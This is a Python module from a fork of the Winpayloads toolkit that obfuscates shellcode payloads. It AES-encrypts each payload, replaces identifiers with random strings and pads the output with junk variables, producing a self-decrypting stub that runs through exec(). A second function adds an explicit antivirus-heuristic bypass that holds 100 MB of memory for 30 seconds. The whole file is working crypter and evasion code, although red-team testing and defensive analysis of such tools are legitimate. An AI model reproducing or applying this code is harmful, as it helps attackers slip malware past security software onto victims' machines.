#!/usr/bin/python

# FORKED BY:        https://github.com/nccgroup/Winpayloads
# DIRECTORY:        lib/encrypt.py
# FORK DATE:        18.09.2017
# COMMIT:           0b07303 on 15 Aug (0b073035f92bccfb0f16354ce006241f7baab67f)

import Crypto.Cipher.AES as AES
import os
import random
import string

def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
    newString = ''
    for i in xrange(random.randint(1, 26)):
        newString += ''.join(random.sample(string.ascii_lowercase, i))
    return newString

def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()

    randdecrypt = randomJunk()
    randshellcode = randomJunk()

    randctypes = randomJunk()
    randaes = randomJunk()

    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
    newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
    newpayload += "%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
    newpayload += "exec(%s)" % randcipher
    return newpayload


def do_Encryption_v2(payload):
    counter = os.urandom(16)
    key = os.urandom(32)

    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()

    randdecrypt = randomJunk()
    randshellcode = randomJunk()

    randctypes = randomJunk()
    randaes = randomJunk()

    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))

    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
    newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
    newpayload += "%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))

    ######################################################################################################
    # Solution to bypass AV-Heuristic scan: allocate 100 MB of ram for 30 sec
    mem_var = randomVar()
    mem_size = "100000000"  # 100 MB
    th_time = "30"          # 30 sec
    th_fx = randomVar()

    newpayload += "\nglobal %s\n" % (mem_var)
    newpayload += "%s = '\x48' * %s\n" % (mem_var, mem_size)
    newpayload += "import threading\n"
    newpayload += "def %s (): global %s; %s = '\x48'\n" % (th_fx, mem_var, mem_var)
    newpayload += "threading.Timer(%s, %s).start()\n" % (th_time, th_fx)
    ######################################################################################################

    newpayload += "exec(%s)" % randcipher
    return newpayload